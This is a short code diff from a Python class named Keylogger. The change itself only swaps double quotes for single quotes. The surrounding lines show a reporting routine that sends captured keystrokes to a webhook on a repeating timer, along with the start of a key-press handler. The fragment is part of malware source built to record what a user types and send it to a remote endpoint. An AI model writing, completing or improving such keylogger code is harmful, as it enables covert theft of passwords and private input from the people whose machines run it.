@@ -14,9 +14,9 @@ class Keylogger:
         self.log = ""
 
     def _report(self):
-        if self.log != "":
+        if self.log != '':
             self.webhook.send(self.log)
-            self.log = ""
+            self.log = ''
         Timer(self.interval, self._report).start()
 
     def _on_key_press(self, key):
